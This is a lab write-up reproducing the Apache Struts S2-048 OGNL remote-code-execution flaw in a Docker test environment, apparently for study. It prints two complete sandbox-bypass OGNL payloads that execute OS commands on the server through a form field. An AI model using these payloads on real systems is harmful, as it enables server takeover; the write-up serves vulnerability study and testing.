# S2-048 Remote Code Execution Vulnerability

Impact version: 2.0.0 - 2.3.32

Vulnerability details:

 - http://struts.apache.org/docs/s2-048.html
 - http://bobao.360.cn/learning/detail/4078.html
 - http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/

## Test environment construction

```
Docker-compose up -d
```

## Vulnerability recurrence

See the reference documentation for details. Just talk about the current environment.

This environment is directly downloaded from the struts-2.3.32 showcase, deployed under tomcat-8.5. After the environment is started, visit the http://your-ip:8080/showcase/` to view the test page of struts2.

Visit Integration/Struts 1 Integration:

![](01.png)

The location that triggers the OGNL expression is the `Gangster Name` form.

Enter `${233*233}` to see the results of the execution (the remaining two forms are free to fill in):

![](02.png)

I borrowed a sandbox bypass method from S2-045 and I changed a POC. Fill in the following POC into the form `Gengster Name`, and submit the result directly to the command execution:

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(# ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(# context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()) ).(#q)}
```

![](03.png)

Of course, you can also use the POC of s2-045 directly (you need to test under Burp):

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(# ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(# context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win' ))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p =new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse ().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

```